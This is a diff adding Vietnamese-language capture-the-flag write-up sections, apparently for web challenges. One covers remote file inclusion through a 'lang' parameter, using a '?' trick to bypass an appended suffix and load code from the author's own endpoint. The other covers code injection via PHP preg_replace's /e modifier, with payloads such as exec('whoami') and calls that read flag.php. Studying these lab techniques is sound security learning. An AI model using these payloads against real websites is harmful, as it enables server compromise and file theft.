@@ -68,4 +68,32 @@ var token = groups[1];
 6. Thêm admincookie rồi vào endpoint session=admin thì nhận được flag.
 ![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a0bee487-2455-4b01-911f-5f2a91328bf3)
 
-## 
+## Remote File Inclusion
+
+1. Ở bài này có thể thấy hint từ tiêu đề là RFI vào param `lang`.
+2. Thử nhiều payload nhận thấy trong thông báo lỗi rằng các đầu vào đều được thêm đoạn `_lang.php` vào.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/207dc1c5-ec46-47cb-8009-913a57e1dfce)
+3. Để bypass nó thử các trick như `%00` hay `#` đều không được. Nhưng `?` thì lại thành công.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/53805ead-2610-475a-ab9b-c3d285dd3329)
+4. Tạo một endpoint trên site của mình. (Ở đây phải đổi payload.php về payload vì để .php là 1 file chứ k phải 1 endpoint =.=)
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a67164e6-6ed7-4bfc-99a3-e011eca19d84)
+5. Trỏ về endpoint đấy, mở source.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/91322818-374b-4e28-856d-cc1daf411190)
+
+## PHP – preg_replace()
+
+1. Ở bài này thử sử dụng hàm preg_replace(). Đồng thời search các cách bypass hàm này thì nhận thấy trong php ver < 5.5 modifier “e”, khi xuất hiện trong patterns thì hàm preg_replace() sẽ parse replacements thành mã PHP, sau đó sẽ tìm kiếm patterns trong chuỗi input và thay nó bằng kết quả thực thi.
+2. Sau khi thử nhiều payload.
+``
+search=/microsoft/e&replace=exec('whoami');&content=Visit+Microsoft
+Visit Microsoft
+search=microsoft/e&replace=exec('whoami');&content=Visit+microsoft
+Warning: preg_replace(): Delimiter must not be alphanumeric or backslash in /challenge/web-serveur/ch37/index.php on line 25
+search=/microsoft/e&replace=exec('whoami');&content=Visit+microsoft
+Warning: exec() has been disabled for security reasons in /challenge/web-serveur/ch37/index.php(25) : regexp code on line 1
+``
+3. Nhận thấy được một vài điều rằng patterns chưa có dấu / ở đầu.
+4. Các hàm như exec, shell_exec, system đều bị filter. Ở đây ta có thể dùng các hàm sau đều có thể exploit được đó là `phpinfo()`, `file_get_content("flag.php")` hoặc `fread(fopen("flag.php","r"),filesize("flag.php"))`
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/9c01d6f4-804d-4c8a-928f-40d0529d1b51)
+
+##
